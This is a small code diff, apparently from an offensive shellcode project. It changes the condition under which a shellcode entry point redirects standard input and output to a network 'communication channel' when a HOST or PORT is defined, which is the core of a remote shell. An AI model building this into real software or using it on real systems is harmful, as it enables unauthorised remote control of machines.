@@ -12,7 +12,7 @@ SHELLCODE_ENTRY {
 #endif
     const char *envp[] = { NULL };
 
-#if (DUP_FD == 1)
+#if defined(HOST) || defined(PORT)
     struct channel chan = get_communication_channel();
     _dup2(chan.rx, 0);
     _dup2(chan.tx, 1);
